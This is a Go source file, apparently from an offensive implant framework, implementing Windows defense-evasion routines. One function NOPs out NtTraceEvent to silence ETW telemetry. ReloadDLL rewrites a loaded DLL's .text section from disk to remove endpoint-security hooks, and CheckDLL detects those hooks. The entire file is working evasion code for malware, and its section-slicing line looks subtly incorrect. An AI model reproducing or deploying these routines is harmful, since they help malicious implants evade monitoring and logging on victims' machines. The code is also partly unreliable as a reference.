//go:build windows

package evade

import (
	"debug/pe"
	"io"
	"os"
	"sync"
	"unsafe"

	"github.com/iDigitalFlame/xmt/device/winapi"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

var zteOnce struct {
	sync.Once
	e error
}

// ZeroTraceEvent will attempt to zero out the NtTraceEvent function call with
// a NOP.
//
// This will return an error if it fails.
//
// This is just a wrapper for the winapi function call as we want to keep the
// function body in winapi for easy crypt wrapping.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func ZeroTraceEvent() error {
	zteOnce.Do(func() {
		zteOnce.e = winapi.ZeroTraceEvent()
	})
	return zteOnce.e
}

// ReloadDLL is a function shamelessly stolen from the sliver project. This
// function will read a DLL file from on-disk and rewrite over it's current
// in-memory contents to erase any hooks placed on function calls.
//
// Re-mastered and refactored to be less memory hungry and easier to read :P
//
// Orig src here:
//   https://github.com/BishopFox/sliver/blob/f94f0fc938ca3871390c5adfa71bf4edc288022d/implant/sliver/evasion/evasion_windows.go#L116
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func ReloadDLL(d string) error {
	if bugtrack.Enabled {
		bugtrack.Track("evade.ReloadDLL(): Received call to reload DLL d=%s.", d)
	}
	var (
		e      = fullPath(d)
		f, err = os.Open(e)
	)
	if err != nil {
		return err
	}
	b, err := io.ReadAll(f)
	if err != nil {
		f.Close()
		return err
	}
	f.Seek(0, 0)
	p, err := pe.NewFile(f)
	if err != nil {
		f.Close()
		return err
	}
	s := p.Section(sect)
	if f.Close(); s == nil {
		return xerr.Sub("cannot find '.text' section", 0x9)
	}
	var (
		v = b[s.Offset:s.Size]
		x uintptr
	)
	if x, err = winapi.LoadDLL(d); err != nil {
		return err
	}
	var (
		i = x + uintptr(s.VirtualAddress)
		o uint32
	)
	if err = winapi.VirtualProtect(i, uint64(len(v)), 0x40, &o); err != nil {
		return err
	}
	if bugtrack.Enabled {
		bugtrack.Track("evade.ReloadDLL(): Writing on-disk bytes %X-%X to d=%s.", i, i+uintptr(len(v)), d)
	}
	// NOTE(dij): This is an interesting way to copy memory.
	//            Need to look into this further.
	for a := 0; a < len(v); a++ {
		// NOTE(dij): Potentially less allocate-y version of:
		//             r := (*[1]byte)(unsafe.Pointer(i + uintptr(a)))
		//             (*r)[0] = v[i]
		//            Also: "possible misuse of unsafe.Pointer"
		//            fucking lol.
		(*(*[1]byte)(unsafe.Pointer(i + uintptr(a))))[0] = v[a]
	}
	if err = winapi.VirtualProtect(i, uint64(len(v)), o, &o); bugtrack.Enabled {
		bugtrack.Track("evade.ReloadDLL(): DLL reload complete, d=%s, err=%s.", d, err)
	}
	return err
}
func isBaseName(n string) bool {
	for i := range n {
		if n[i] == ':' || n[i] == '/' || n[i] == '\\' {
			return false
		}
	}
	return true
}

// CheckDLL is a similar function to ReloadDLL.
// This function will return 'true' and 'nil' if the contents in memory match the
// contents of the file on disk. Otherwise it returns false.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func CheckDLL(d string) (bool, error) {
	var (
		e      = fullPath(d)
		f, err = os.Open(e)
	)
	if err != nil {
		return false, err
	}
	b, err := io.ReadAll(f)
	if err != nil {
		f.Close()
		return false, err
	}
	f.Seek(0, 0)
	p, err := pe.NewFile(f)
	if err != nil {
		f.Close()
		return false, err
	}
	s := p.Section(sect)
	if f.Close(); s == nil {
		return false, xerr.Sub("cannot find '.text' section", 0x9)
	}
	var (
		v = b[s.Offset:s.Size]
		x uintptr
	)
	if x, err = winapi.LoadDLL(d); err != nil {
		return false, err
	}
	for a, i := 0, uintptr(x)+uintptr(s.VirtualAddress); a < len(v); a++ {
		if (*(*[1]byte)(unsafe.Pointer(i + uintptr(a))))[0] != v[a] {
			if bugtrack.Enabled {
				bugtrack.Track("evade.CheckDLL(): Hook for d=%s detected at %X!", d, i+uintptr(a))
			}
			return false, nil
		}
	}
	return true, nil
}
